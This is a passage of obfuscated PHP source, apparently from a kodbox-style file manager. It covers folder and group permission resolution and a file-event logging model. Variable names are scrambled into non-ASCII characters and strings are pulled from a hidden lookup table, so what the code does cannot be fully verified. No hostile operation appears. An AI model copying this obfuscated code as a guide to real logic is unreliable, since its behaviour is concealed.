= $âı≤◊ô±->getInfo($Ô√éÍ›…); $›óùÛÅ´ = $Œïˆ©åó->parentLevelArray($îàÕÖ°∑[$äÃ˙ﬁ´«[521]]); $†€Ω∞Ø« = array_merge($†€Ω∞Ø«, $›óùÛÅ´); } $†€Ω∞Ø« = array_values(array_unique($†€Ω∞Ø«)); foreach ($†€Ω∞Ø« as $Ô√éÍ›…) { $îàÕÖ°∑ = $âı≤◊ô±->getInfo($Ô√éÍ›…); $∂ñöÑ§¡[] = $îàÕÖ°∑[$äÃ˙ﬁ´«[97]][$äÃ˙ﬁ´«[403]]; $·∏ö«‹Ù[$Ô√éÍ›…] = $îàÕÖ°∑[$äÃ˙ﬁ´«[97]][$äÃ˙ﬁ´«[403]]; $›õ»’ÿ•[$Ô√éÍ›…] = $Œïˆ©åó->parentLevelArray($îàÕÖ°∑[$äÃ˙ﬁ´«[521]]); } foreach ($˛”°Ó≥È as $≈®™ ï∞ => $á˘›∏¿®) { $å◊ªÂàû = $ªÍ˜ã¬·[$≈®™ ï∞]; if (!$å◊ªÂàû || !$·∏ö«‹Ù[$å◊ªÂàû]) { continue; } $Äò«èÓÈ = array(); foreach ($›õ»’ÿ•[$å◊ªÂàû] as $Ô√éÍ›…) { $Äò«èÓÈ[] = $·∏ö«‹Ù[$Ô√éÍ›…]; } $˛”°Ó≥È[$≈®™ ï∞] = array_merge($Äò«èÓÈ, $á˘›∏¿®); } $∂ñöÑ§¡ = array_values(array_unique($∂ñöÑ§¡)); $±›üÖ∂¿ = array($äÃ˙ﬁ´«[1979] => $∂ñöÑ§¡, $äÃ˙ﬁ´«[1980] => $˛”°Ó≥È); $÷Ô«à Ù[$π–ÛóÂÄ] = $±›üÖ∂¿; return $±›üÖ∂¿; } private function makeSourceAuth($≥∆œ…´∞, $Ìüÿ≥â±, $≠†–‚ê = false) { $óö«Ü‘– =& $_SERVER[ëæªã÷]; $∆ºÁá≥º = $óö«Ü‘–[99]; $µÛÂÖ÷è = $≥∆œ…´∞[$óö«Ü‘–[504]]; $ßµÎôºñ = $≥∆œ…´∞[$óö«Ü‘–[412]] == SourceModel::TYPE_GROUP; $¯çÇ÷’˚ = $ßµÎôºñ ? $this->groupRootAuth($µÛÂÖ÷è, $≠†–‚ê) : !1; if ($¯çÇ÷’˚ && Model($óö«Ü‘–[507])->authCheckAction($¯çÇ÷’˚[$óö«Ü‘–[414]], $óö«Ü‘–[1816])) { return $this->groupAuthInfo($¯çÇ÷’˚, $µÛÂÖ÷è); } $åí…çÇÍ = Model($óö«Ü‘–[1301])->parentLevelArray($≥∆œ…´∞[$óö«Ü‘–[521]]); $åí…çÇÍ = array_merge(array($≥∆œ…´∞[$óö«Ü‘–[403]]), array_reverse($åí…çÇÍ)); $¶‹≥Òƒµ = !1; foreach ($åí…çÇÍ as $Öß‡ÑÂ—) { if (!isset($Ìüÿ≥â±[$Öß‡ÑÂ—])) { continue; } $·çËÈ¡Æ = $this->authMake($Ìüÿ≥â±[$Öß‡ÑÂ—], $≠†–‚ê); if ($·çËÈ¡Æ[$óö«Ü‘–[466]]) { $¶‹≥Òƒµ = $·çËÈ¡Æ; break; } } if (!$ßµÎôºñ) { return $¶‹≥Òƒµ; } if (!$¶‹≥Òƒµ && $¯çÇ÷’˚) { $¶‹≥Òƒµ = $this->groupAuthInfo($¯çÇ÷’˚, $µÛÂÖ÷è); } if (!$¶‹≥Òƒµ) { $ò≈–è◊Ï = Model($óö«Ü‘–[522])->getInfo($µÛÂÖ÷è); $û˜∆‚¢≈ = explode($óö«Ü‘–[50], trim($ò≈–è◊Ï[$óö«Ü‘–[521]], $óö«Ü‘–[50])); $û˜∆‚¢≈ = array_reverse($û˜∆‚¢≈); foreach ($û˜∆‚¢≈ as $∂Æµ”¢‰) { if ($∂Æµ”¢‰ == $óö«Ü‘–[200] || $∂Æµ”¢‰ == $∆ºÁá≥º) { continue; } $Öã˜‘àÃ = $this->groupRootAuth($∂Æµ”¢‰, $≠†–‚ê); if (!$Öã˜‘àÃ) { continue; } $¶‹≥Òƒµ = $this->groupAuthInfo($Öã˜‘àÃ, $∂Æµ”¢‰); break; } } if (!$¶‹≥Òƒµ || $¶‹≥Òƒµ[$óö«Ü‘–[415]] <= 0) { $ÈﬂÔπ‰ø = $this->authDeepCheck($≥∆œ…´∞[$óö«Ü‘–[403]], $≠†–‚ê); if ($ÈﬂÔπ‰ø) { $¶‹≥Òƒµ = $ÈﬂÔπ‰ø; } } return $¶‹≥Òƒµ; } private function userIsRoot($ÛêÓ˚î˝ = false) { $ÍÑ„≥⁄¢ =& $_SERVER[ëæªã÷]; if (!$ÛêÓ˚î˝ && _get($GLOBALS, $ÍÑ„≥⁄¢[505])) { return !0; } $ºÛﬂäªó = Model($ÍÑ„≥⁄¢[538])->getInfo($ÛêÓ˚î˝); $“Áé˝Ùﬁ = Model($ÍÑ„≥⁄¢[1988])->listData($ºÛﬂäªó[$ÍÑ„≥⁄¢[1508]]); if ($“Áé˝Ùﬁ && $“Áé˝Ùﬁ[$ÍÑ„≥⁄¢[511]][$ÍÑ„≥⁄¢[1989]] == 1) { return !0; } return !1; } private function sourceAuthInfo($¿¿‰Áå¸) { $⁄π–œÖæ =& $_SERVER[ëæªã÷]; $∂π∆ôú¯ = Model($⁄π–œÖæ[1301]); $∑ÓÄäãÑ = $∂π∆ôú¯->sourceInfo($¿¿‰Áå¸); if (!$∑ÓÄäãÑ) { return !1; } $∂π∆ôú¯->groupPathDisplay($∑ÓÄäãÑ); $ÆõÁ°ÒÚ = array($∑ÓÄäãÑ); $ÆõÁ°ÒÚ = $∂π∆ôú¯->_listAppendPath($ÆõÁ°ÒÚ); $∑ÓÄäãÑ = $ÆõÁ°ÒÚ[0]; $ò√ÛÚßﬂ = $∑ÓÄäãÑ[$⁄π–œÖæ[519]]; if (isset($∑ÓÄäãÑ[$⁄π–œÖæ[527]])) { $ˆëƒ≈æö = explode($⁄π–œÖæ[8], trim($∑ÓÄäãÑ[$⁄π–œÖæ[519]], $⁄π–œÖæ[8])); array_shift($ˆëƒ≈æö); $ò√ÛÚßﬂ = $∑ÓÄäãÑ[$⁄π–œÖæ[525]] . $⁄π–œÖæ[1990] . implode($⁄π–œÖæ[8], $ˆëƒ≈æö); } return array($⁄π–œÖæ[421] => $∑ÓÄäãÑ[$⁄π–œÖæ[32]], $⁄π–œÖæ[88] => KodIO::make($∑ÓÄäãÑ[$⁄π–œÖæ[403]]), $⁄π–œÖæ[1991] => $ò√ÛÚßﬂ); } private function groupAuthInfo($¯ÁáÓ≈™, $¨ﬁî›ôÿ) { $ñ¡è∂Î≠ =& $_SERVER[ëæªã÷]; $ƒ∏Ì‰• = Model($ñ¡è∂Î≠[522])->getInfo($¨ﬁî›ôÿ); return array($ñ¡è∂Î≠[1992] => intval($¯ÁáÓ≈™[$ñ¡è∂Î≠[414]]), $ñ¡è∂Î≠[1976] => $¯ÁáÓ≈™, $ñ¡è∂Î≠[1993] => LNG($ñ¡è∂Î≠[1994]), $ñ¡è∂Î≠[1985] => array($ñ¡è∂Î≠[421] => $ƒ∏Ì‰•[$ñ¡è∂Î≠[32]], $ñ¡è∂Î≠[88] => KodIO::make($ƒ∏Ì‰•[$ñ¡è∂Î≠[97]][$ñ¡è∂Î≠[403]]), $ñ¡è∂Î≠[1991] => $ƒ∏Ì‰•[$ñ¡è∂Î≠[526]])); } protected function groupRootAuth($§ü œü∆, $‘ÃôÆ≤É = false) { $öêÑöÓâ =& $_SERVER[ëæªã÷]; $‘ÃôÆ≤É = $‘ÃôÆ≤É ? $‘ÃôÆ≤É : USER_ID; $ØÜÔﬂêˆ = $‘ÃôÆ≤É . $öêÑöÓâ[1995] . $§ü œü∆; static $ÃÌ≥ÑŒ⁄ = array(); if (isset($ÃÌ≥ÑŒ⁄[$ØÜÔﬂêˆ])) { return $ÃÌ≥ÑŒ⁄[$ØÜÔﬂêˆ]; } $®†ö÷©÷ = Model($öêÑöÓâ[522])->getInfo($§ü œü∆); $ª’ºë◊è = $this->userGroupList($‘ÃôÆ≤É); $˛∑ˆû—ü = isset($ª’ºë◊è[$§ü œü∆]) ? $ª’ºë◊è[$§ü œü∆][$öêÑöÓâ[414]] : !1; if ($˛∑ˆû—ü && Model($öêÑöÓâ[507])->authCheckAction($˛∑ˆû—ü[$öêÑöÓâ[414]], $öêÑöÓâ[1816])) { $ÃÌ≥ÑŒ⁄[$ØÜÔﬂêˆ] = $˛∑ˆû—ü; return $˛∑ˆû—ü; } $Ñ¸∫≤â¶ = $this->sourceAuthSelect($®†ö÷©÷[$öêÑöÓâ[97]][$öêÑöÓâ[403]]); $úâ”ß⁄˜ = $Ñ¸∫≤â¶ ? $this->authMake($Ñ¸∫≤â¶, $‘ÃôÆ≤É) : !1; $⁄ùÁΩ∑À = $úâ”ß⁄˜ ? $úâ”ß⁄˜[$öêÑöÓâ[466]] : !1; $ÃÌ≥ÑŒ⁄[$ØÜÔﬂêˆ] = $⁄ùÁΩ∑À ? $⁄ùÁΩ∑À : $˛∑ˆû—ü; return $ÃÌ≥ÑŒ⁄[$ØÜÔﬂêˆ]; } public function authOwnerApply($¡†åúêÊ) { $ÄÅ˜√ÚÀ =& $_SERVER[ëæªã÷]; if (empty($¡†åúêÊ[$ÄÅ˜√ÚÀ[414]]) || isset($¡†åúêÊ[$ÄÅ˜√ÚÀ[1996]]) && $¡†åúêÊ[$ÄÅ˜√ÚÀ[1996]]) { return $¡†åúêÊ; } if (AuthModel::authCheckRoot($¡†åúêÊ[$ÄÅ˜√ÚÀ[414]][$ÄÅ˜√ÚÀ[415]])) { return $¡†åúêÊ; } $ºÒÀÅ‘œ = Model($ÄÅ˜√ÚÀ[1301])->parentLevelArray($¡†åúêÊ[$ÄÅ˜√ÚÀ[521]]); $ºÒÀÅ‘œ = array_merge(array($¡†åúêÊ[$ÄÅ˜√ÚÀ[403]]), array_reverse($ºÒÀÅ‘œ)); $≠Ωÿ˛“‰ = $this->sourceAuthSelect($ºÒÀÅ‘œ); $ÿ”ï›¨á = array(); $ºŒô¯‰ˆ = array(); foreach ($≠Ωÿ˛“‰ as $ì˜≥Í›Ï => $èÄ´ØîÂ) { $´ˆœæ¿ˆ = $this->authFolderOwnerUser($èÄ´ØîÂ); $ÿ”ï›¨á[$ì˜≥Í›Ï] = $´ˆœæ¿ˆ; $ºŒô¯‰ˆ = array_merge($ºŒô¯‰ˆ, $´ˆœæ¿ˆ[$ÄÅ˜√ÚÀ[594]]); if ($´ˆœæ¿ˆ[$ÄÅ˜√ÚÀ[1997]]) { break; } } if (count($ºŒô¯‰ˆ) == 0) { $ºŒô¯‰ˆ = $this->authFolderOwnerGroup($¡†åúêÊ[$ÄÅ˜√ÚÀ[504]]); } $ºŒô¯‰ˆ = array_unique($ºŒô¯‰ˆ); if (AuthModel::authCheckRoot($¡†åúêÊ[$ÄÅ˜√ÚÀ[414]][$ÄÅ˜√ÚÀ[415]])) { $ºŒô¯‰ˆ[] = USER_ID; } $¡†åúêÊ[$ÄÅ˜√ÚÀ[414]][$ÄÅ˜√ÚÀ[1998]] = Model($ÄÅ˜√ÚÀ[513])->userListInfo($ºŒô¯‰ˆ); return $¡†åúêÊ; } private function authFolderOwnerGroup($ÃŒä¢’ç) { $ä≥ê∂çÁ =& $_SERVER[ëæªã÷]; $√ï≈«‰‘ = Model($ä≥ê∂çÁ[1885])->where(array($ä≥ê∂çÁ[1796] => $ÃŒä¢’ç))->select(); $‘§Ò¶¬Ã = array(); if (!$√ï≈«‰‘) { return $‘§Ò¶¬Ã; } foreach ($√ï≈«‰‘ as $‚óäÑª—) { $ÜÄ≈÷∏∞ = $this->authInfo($‚óäÑª—); if (AuthModel::authCheckRoot($ÜÄ≈÷∏∞[$ä≥ê∂çÁ[414]])) { $‘§Ò¶¬Ã[] = $‚óäÑª—[$ä≥ê∂çÁ[1628]]; } } return $‘§Ò¶¬Ã; } private function authFolderOwnerUser($ı¬€——À) { $Ê˛î´†≈ =& $_SERVER[ëæªã÷]; $€Öõ¬≈Ô = array(); $ˆ…¸çø≤ = !1; foreach ($ı¬€——À as $≈ù¯Æí“) { $â√áÎ‘Å = $this->authInfo($≈ù¯Æí“); if ($≈ù¯Æí“[$Ê˛î´†≈[504]] == $Ê˛î´†≈[200]) { $ˆ…¸çø≤ = !0; } if ($≈ù¯Æí“[$Ê˛î´†≈[412]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($â√áÎ‘Å[$Ê˛î´†≈[414]])) { $€Öõ¬≈Ô[] = $≈ù¯Æí“[$Ê˛î´†≈[504]]; } } } return array($Ê˛î´†≈[594] => $€Öõ¬≈Ô, $Ê˛î´†≈[1997] => $ˆ…¸çø≤); } public function authMake($ﬂ±êÈñÃ, $ÖÆî∑ÏÄ = false) { $ı∫‹†©Æ =& $_SERVER[ëæªã÷]; $Ç”¯ˆ‹ª = $this->authArrayCheck($ﬂ±êÈñÃ, $ÖÆî∑ÏÄ); if ($Ç”¯ˆ‹ª[$ı∫‹†©Æ[1999]]) { $Ç”¯ˆ‹ª[$ı∫‹†©Æ[1999]] = $this->sourceAuthInfo($Ç”¯ˆ‹ª[$ı∫‹†©Æ[1999]]); } return $Ç”¯ˆ‹ª; } public function authArrayCheck($òñáÓ»Ó, $´⁄¢¨¢ó = false) { $≈∑˛á‹ =& $_SERVER[ëæªã÷]; if (!$òñáÓ»Ó) { return array($≈∑˛á‹[415] => 0, $≈∑˛á‹[466] => !1); } $´⁄¢¨¢ó = $´⁄¢¨¢ó ? $´⁄¢¨¢ó : USER_ID; $ÊãÑ≈≤ã = 0; $ÈÂÄ˚ÎÚ = 0; $ë∏Ñ —ù = 0; $ç‘œú¶Ç = 0; $¥¨¬âﬁ€ = 0; $Ç÷ıÅò˛ = 0; $¨¯Ø≈ç‹ = 1000; $¬ˆëˆÍ¢ = 0; $Ã∫É≤”© = 0; $Úø◊öÉ∞ = 0; $∞Ü„ÈËÃ = 0; $ë¡ÜŸ•ú = array($≈∑˛á‹[403] => 0); foreach ($òñáÓ»Ó as $ë¡ÜŸ•ú) { $˘◊ç¸Ö = $this->authInfo($ë¡ÜŸ•ú); if (!$˘◊ç¸Ö) { continue; } $û◊»‘ÕŸ = $ë¡ÜŸ•ú[$≈∑˛á‹[504]]; $“Õæëï€ = intval($˘◊ç¸Ö[$≈∑˛á‹[414]]); if ($ë¡ÜŸ•ú[$≈∑˛á‹[412]] == SourceModel::TYPE_USER && $û◊»‘ÕŸ == $´⁄¢¨¢ó) { $ÊãÑ≈≤ã = !0; $ë∏Ñ —ù = $˘◊ç¸Ö; $ÈÂÄ˚ÎÚ = $“Õæëï€; } else { if ($ë¡ÜŸ•ú[$≈∑˛á‹[412]] == SourceModel::TYPE_GROUP && $this->groupContainUser($û◊»‘ÕŸ, $´⁄¢¨¢ó)) { $ç‘œú¶Ç = !0; $® ó£ïã = $this->groupStepToUserGroup($û◊»‘ÕŸ, $´⁄¢¨¢ó); if ($® ó£ïã < $¨¯Ø≈ç‹) { $¨¯Ø≈ç‹ = $® ó£ïã; $¥¨¬âﬁ€ = $“Õæëï€; $Ç÷ıÅò˛ = $˘◊ç¸Ö; $¬ˆëˆÍ¢ = $û◊»‘ÕŸ; } if ($® ó£ïã == $¨¯Ø≈ç‹ && $“Õæëï€ >= $¥¨¬âﬁ€) { $¥¨¬âﬁ€ = $“Õæëï€; $Ç÷ıÅò˛ = $˘◊ç¸Ö; $¬ˆëˆÍ¢ = $û◊»‘ÕŸ; } } else { if ($û◊»‘ÕŸ == $≈∑˛á‹[200]) { $Ã∫É≤”© = !0; $∞Ü„ÈËÃ = $˘◊ç¸Ö; $Úø◊öÉ∞ = $“Õæëï€; } } } } if ($ÊãÑ≈≤ã) { $È”ô√∏Ô = $ÈÂÄ˚ÎÚ; $˘◊ç¸Ö = $ë∏Ñ —ù; $º˙ËÔˆë = LNG($≈∑˛á‹[2000]); } else { if ($ç‘œú¶Ç) { $È”ô√∏Ô = $¥¨¬âﬁ€; $˘◊ç¸Ö = $Ç÷ıÅò˛; $å€ôıúÓ = Model($≈∑˛á‹[522])->getInfo($¬ˆëˆÍ¢); $º˙ËÔˆë = $≈∑˛á‹[169] . $å€ôıúÓ[$≈∑˛á‹[526]] . $≈∑˛á‹[2001] . LNG($≈∑˛á‹[2002]); } else { if ($Ã∫É≤”©) { $È”ô√∏Ô = $Úø◊öÉ∞; $˘◊ç¸Ö = $∞Ü„ÈËÃ; $º˙ËÔˆë = LNG($≈∑˛á‹[1973]); } else { $È”ô√∏Ô = 0; $˘◊ç¸Ö = !1; $º˙ËÔˆë = $≈∑˛á‹[12]; } } } $ºÏ˚ÎÙÜ = array($≈∑˛á‹[1992] => intval($È”ô√∏Ô), $≈∑˛á‹[1976] => $˘◊ç¸Ö, $≈∑˛á‹[1993] => $º˙ËÔˆë, $≈∑˛á‹[1985] => $ë¡ÜŸ•ú[$≈∑˛á‹[403]]); return $ºÏ˚ÎÙÜ; } private function groupContainUser($ñ›’ó˙‡, $ç∆Ç©≤ò = false) { return in_array($ñ›’ó˙‡, $this->userGroupParents($ç∆Ç©≤ò)); } private function groupStepToUserGroup($Áœ±•ﬂ˚, $Áﬂ≥ø÷Â = false) { $ŸñÆ¨ßï =& $_SERVER[ëæªã÷]; $¨Ë¡˜à™ = $this->userGroupList($Áﬂ≥ø÷Â); $Ê⁄ÍøòÄ = 1000; $ç∆∂äá† = $GLOBALS[$ŸñÆ¨ßï[6]][$ŸñÆ¨ßï[100]][$ŸñÆ¨ßï[1896]] == 1; $òô∞É±ˆ = $ç∆∂äá† ? 3 : 2; foreach ($¨Ë¡˜à™ as $•™˚£µå) { if ($•™˚£µå[$ŸñÆ¨ßï[1796]] == $Áœ±•ﬂ˚) { return 0; } $ﬂ“—…â° = explode($ŸñÆ¨ßï[50], trim($•™˚£µå[$ŸñÆ¨ßï[521]], $ŸñÆ¨ßï[50])); if ($ﬂ“—…â°[0] == $ŸñÆ¨ßï[200] && count($ﬂ“—…â°) > $òô∞É±ˆ) { $µ´∂Áÿ† = array_reverse(array_slice($ﬂ“—…â°, $òô∞É±ˆ)); $ûÛüäΩò = array_search($Áœ±•ﬂ˚, $µ´∂Áÿ†); if ($ûÛüäΩò !== !1 && $ûÛüäΩò + 1 <= $Ê⁄ÍøòÄ) { $Ê⁄ÍøòÄ = $ûÛüäΩò + 1; } } } return $Ê⁄ÍøòÄ; } private function userGroupList($áó⁄ßÛ = false) { $ùÎ¡ë°º =& $_SERVER[ëæªã÷]; static $”ñò∫ÓÁ = array(); if (isset($”ñò∫ÓÁ[$áó⁄ßÛ])) { return $”ñò∫ÓÁ[$áó⁄ßÛ]; } $⁄”£«î⁄ = Model($ùÎ¡ë°º[538])->getInfo($áó⁄ßÛ); $”ñò∫ÓÁ[$áó⁄ßÛ] = array_to_keyvalue($⁄”£«î⁄[$ùÎ¡ë°º[1974]], $ùÎ¡ë°º[1796]); return $”ñò∫ÓÁ[$áó⁄ßÛ]; } public function userGroupParents($ŒÇÌå—õ) { $§‰»∫’’ =& $_SERVER[ëæªã÷]; static $Ë“¬Üª· = array(); $ŒÇÌå—õ = $ŒÇÌå—õ ? $ŒÇÌå—õ : USER_ID; if (isset($Ë“¬Üª·[$ŒÇÌå—õ])) { return $Ë“¬Üª·[$ŒÇÌå—õ]; } $›–—ÆÁÍ = $this->userGroupList($ŒÇÌå—õ); $ô◊–ÜÔ√ = array(); $ÌªªíÓ£ = $GLOBALS[$§‰»∫’’[6]][$§‰»∫’’[100]][$§‰»∫’’[1896]] == 1; $—è»—´é = $ÌªªíÓ£ ? 3 : 2; foreach ($›–—ÆÁÍ as $√˙ËÀÃ™) { $⁄«ïÁÿ = array($√˙ËÀÃ™[$§‰»∫’’[1796]]); $˝¶—∫∏Á = explode($§‰»∫’’[50], trim($√˙ËÀÃ™[$§‰»∫’’[521]], $§‰»∫’’[50])); if ($˝¶—∫∏Á[0] == $§‰»∫’’[200] && count($˝¶—∫∏Á) > $—è»—´é) { $—∆∆£ö˚ = array_slice($˝¶—∫∏Á, $—è»—´é); $⁄«ïÁÿ = array_merge($⁄«ïÁÿ, array_reverse($—∆∆£ö˚)); } $ô◊–ÜÔ√ = array_merge($ô◊–ÜÔ√, $⁄«ïÁÿ); } $Ë“¬Üª·[$ŒÇÌå—õ] = array_unique($ô◊–ÜÔ√); return $Ë“¬Üª·[$ŒÇÌå—õ]; } public function authTargetInfoMake($™˙Ïıõ—) { $ë∂∂ÓÊ =& $_SERVER[ëæªã÷]; $›–ıÃﬁ∫ = array(); $ﬂ·¿é‡ô = array(); foreach ($™˙Ïıõ— as $ºƒ»Ê™Ï) { if ($ºƒ»Ê™Ï[$ë∂∂ÓÊ[412]] == SourceModel::TYPE_USER) { $›–ıÃﬁ∫[] = intval($ºƒ»Ê™Ï[$ë∂∂ÓÊ[504]]); } else { if ($ºƒ»Ê™Ï[$ë∂∂ÓÊ[412]] == SourceModel::TYPE_GROUP) { $ﬂ·¿é‡ô[] = intval($ºƒ»Ê™Ï[$ë∂∂ÓÊ[504]]); } } } if ($›–ıÃﬁ∫) { $›–ıÃﬁ∫ = Model($ë∂∂ÓÊ[513])->userListInfo($›–ıÃﬁ∫); } if ($ﬂ·¿é‡ô) { $àû¸ïí– = array($ë∂∂ÓÊ[1883] => array($ë∂∂ÓÊ[419], $ﬂ·¿é‡ô)); $ﬂ·¿é‡ô = Model($ë∂∂ÓÊ[522])->field($ë∂∂ÓÊ[2003])->where($àû¸ïí–)->select(); $ﬂ·¿é‡ô = array_to_keyvalue($ﬂ·¿é‡ô, $ë∂∂ÓÊ[1796]); } return array($ë∂∂ÓÊ[2004] => $›–ıÃﬁ∫, $ë∂∂ÓÊ[2005] => $ﬂ·¿é‡ô); } public function authInfo($˜÷´ó«†) { $Ÿó§ç∆∑ =& $_SERVER[ëæªã÷]; if ($˜÷´ó«†[$Ÿó§ç∆∑[1897]]) { $ü˜Ï´ÜÅ = Model($Ÿó§ç∆∑[507])->listData($˜÷´ó«†[$Ÿó§ç∆∑[1897]]); if (!$ü˜Ï´ÜÅ) { return !1; $êÂõ£˝¶ = Model($Ÿó§ç∆∑[507])->listData(); $˝ø˙˜çÜ = array_filter_by_field($êÂõ£˝¶, $Ÿó§ç∆∑[414], $Ÿó§ç∆∑[200]); return $˝ø˙˜çÜ; } $ŒÖë¸±ó = array_field_key($ü˜Ï´ÜÅ, array($Ÿó§ç∆∑[401], $Ÿó§ç∆∑[32], $Ÿó§ç∆∑[414], $Ÿó§ç∆∑[1818], $Ÿó§ç∆∑[1819])); $ŒÖë¸±ó[$Ÿó§ç∆∑[2006]] = $˜÷´ó«†; return $ŒÖë¸±ó; } else { return array($Ÿó§ç∆∑[420] => 0, $Ÿó§ç∆∑[1802] => $˜÷´ó«†[$Ÿó§ç∆∑[1951]], $Ÿó§ç∆∑[421] => $Ÿó§ç∆∑[12], $Ÿó§ç∆∑[1818] => $Ÿó§ç∆∑[2007]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\162\x63\x65\x5f\x65\x76\145\156\x74"; protected $dataAuto = array(array("\x63\x72\145\141\x74\145\124\x69\x6d\x65", "\164\x69\x6d\145", "\x69\156\x73\x65\162\x74", "\x66\165\156\143\164\151\157\x6e"), array("\x64\x65\x73\143", '', "\151\x6e\x73\145\x72\x74\54\165\160\144\x61\164\x65\54\163\x65\154\145\x63\164", "\x6a\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($õµ…úœ…, $ƒ°¿éŸÏ, $ùŒ∑Íø„ = '') { $üÏ›‰˙Ü =& $_SERVER[ëæªã÷]; if (!$this->eventSave) { return; } $¡ıÙ–§˝ = Model($üÏ›‰˙Ü[1301])->sourceInfo($õµ…úœ…); if (!$¡ıÙ–§˝) { return !1; } if ($this->isCacheEvent($¡ıÙ–§˝, $ƒ°¿éŸÏ)) { return; } if ($ùŒ∑Íø„ && is_string($ùŒ∑Íø„)) { $ùŒ∑Íø„ = array($üÏ›‰˙Ü[1834] => $ùŒ∑Íø„); } $ﬁñú›Ù˜ = array($üÏ›‰˙Ü[418] => $õµ…úœ…, $üÏ›‰˙Ü[2008] => $¡ıÙ–§˝[$üÏ›‰˙Ü[498]], $üÏ›‰˙Ü[2009] => $¡ıÙ–§˝[$üÏ›‰˙Ü[32]], $üÏ›‰˙Ü[519] => !empty($¡ıÙ–§˝[$üÏ›‰˙Ü[519]]) ? $¡ıÙ–§˝[$üÏ›‰˙Ü[519]] : $üÏ›‰˙Ü[12], $üÏ›‰˙Ü[1619] => USER_ID, $üÏ›‰˙Ü[423] => $ƒ°¿éŸÏ, $üÏ›‰˙Ü[1621] => $ùŒ∑Íø„); $this->addSystemLog($ƒ°¿éŸÏ, $ﬁñú›Ù˜); unset($ﬁñú›Ù˜[$üÏ›‰˙Ü[2009]], $ﬁñú›Ù˜[$üÏ›‰˙Ü[519]]); return $this->add($ﬁñú›Ù˜); } private function addSystemLog($ÜÏà´á“, $æÜÈã∫Ê) { $§¸®ÛÜ˘ =& $_SERVER[ëæªã÷]; if ($ÜÏà´á“ == $§¸®ÛÜ˘[2010]) { $ÜÏà´á“ = $æÜÈã∫Ê[$§¸®ÛÜ˘[451]][$§¸®ÛÜ˘[2011]]; } else { if (in_array($ÜÏà´á“, array($§¸®ÛÜ˘[1776], $§¸®ÛÜ˘[2012]))) { $ÜÏà´á“ = $æÜÈã∫Ê[$§¸®ÛÜ˘[451]][$§¸®ÛÜ˘[735]]; } } $⁄Ñ¿ìî¯ = array_merge($æÜÈã∫Ê, array($§¸®ÛÜ˘[2013] => $æÜÈã∫Ê[$§¸®ÛÜ˘[403]], $§¸®ÛÜ˘[2014] => $æÜÈã∫Ê[$§¸®ÛÜ˘[2014]])); Hook::trigger($§¸®ÛÜ˘[2015], $§¸®ÛÜ˘[2016] . $ÜÏà´á“, $æÜÈã∫Ê); Model($§¸®ÛÜ˘[1740])->addLog($§¸®ÛÜ˘[2016] . $ÜÏà´á“, $⁄Ñ¿ìî¯); } private function isCacheEvent($õáÚ—Çá, $◊¨¶ÊÒ√) { if ($õáÚ—Çá[$_SERVER[ëæªã÷][412]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ÎÃÆ„áÎ, $·ô¸Öó°) { $ãÑà⁄û  =& $_SERVER[ëæªã÷]; $”ˆ∞ÑÆ© = Model($ãÑà⁄û [1301])->sourceInfo($ÎÃÆ„áÎ); $¶‡‹Ü†Ï = array($ãÑà⁄û [2011] => $·ô¸Öó°, $ãÑà⁄û [32] => $”ˆ∞ÑÆ©[$ãÑà⁄û [32]]); return $this->addEvent($ÎÃÆ„áÎ, $ãÑà⁄û [2010], $¶‡‹Ü†Ï); } public function eventFileEdit($°˚äï‰™) { $ì‡íà≈‚ =& $_SERVER[ëæªã÷]; $‹œï©Ù˛ = array($ì‡íà≈‚[2017] => $_SERVER[$ì‡íà≈‚[2018]], $ì‡íà≈‚[2019] => strtolower(ACTION)); return $this->addEvent($°˚äï‰™, $ì‡íà≈‚[1766], $‹œï©Ù˛); } public function eventRecycle($Öüçãè¸, $‚ÆÒ–Æ¶) { return $this->addEvent($Öüçãè¸, $_SERVER[ëæªã÷][2012], $‚ÆÒ–Æ¶); } public function eventRemove($«êÊ˝ö–) { $¿É∑Òˆ⁄ =& $_SERVER[ëæªã÷]; $≥Ñ¨ê¢‰ = Model($¿É∑Òˆ⁄[1301])->sourceInfo($«êÊ˝ö–); $‚˜ê˛Ÿı = $≥Ñ¨ê¢‰[$¿É∑Òˆ⁄[32]]; return $this->addEvent($≥Ñ¨ê¢‰[$¿É∑Òˆ⁄[498]], $¿É∑Òˆ⁄[1765], $‚˜ê˛Ÿı); } public function eventShare($˙ﬁœãââ, $ÈçÎ€ßê) { return $this->addEvent($˙ﬁœãââ, $_SERVER[ëæªã÷][1776], $ÈçÎ€ßê); } public function eventMove($éÖÙ≠Üí, $†Üö‡ﬁ˚, $Óﬁçﬂ‰÷) { $‘á£õﬂ∞ =& $_SERVER[ëæªã÷]; $π‰‘Ãé = Model($‘á£õﬂ∞[1301]); $”‘ë©° = $π‰‘Ãé->sourceInfo($éÖÙ≠Üí); $›£≈´Ó‹ = $π‰‘Ãé->sourceInfo($†Üö‡ﬁ˚); $–÷¢®∂¨ = $π‰‘Ãé->sourceInfo($Óﬁçﬂ‰÷); $∫◊˜¬˜≥ = array($‘á£õﬂ∞[1134] => $†Üö‡ﬁ˚, $‘á£õﬂ∞[2020] => $›£≈´Ó‹[$‘á£õﬂ∞[32]], $‘á£õﬂ∞[1999] => !empty($›£≈´Ó‹[$‘á£õﬂ∞[519]]) ? $›£≈´Ó‹[$‘á£õﬂ∞[519]] : $‘á£õﬂ∞[12], $‘á£õﬂ∞[1135] => $Óﬁçﬂ‰÷, $‘á£õﬂ∞[2021] => $–÷¢®∂¨[$‘á£õﬂ∞[32]], $‘á£õﬂ∞[2022] => !empty($–÷¢®∂¨[$‘á£õﬂ∞[519]]) ? $–÷¢®∂¨[$‘á£õﬂ∞[519]] : $‘á£õﬂ∞[12]); $this->addEvent($éÖÙ≠Üí, $‘á£õﬂ∞[551], $∫◊˜¬˜≥); $”‘ë©° = $π‰‘Ãé->sourceInfo($éÖÙ≠Üí); $∫◊˜¬˜≥ = array($‘á£õﬂ∞[403] => $”‘ë©°[$‘á£õﬂ∞[403]], $‘á£õﬂ∞[32] => $”‘ë©°[$‘á£õﬂ∞[32]]); $this->addEvent($†Üö‡ﬁ˚, $‘á£õﬂ∞[2023], $∫◊˜¬˜≥); } public function eventCopy($°õé∏∞à) { $this->eventCreate($°õé∏∞à, $_SERVER[ëæªã÷][549]); } public function 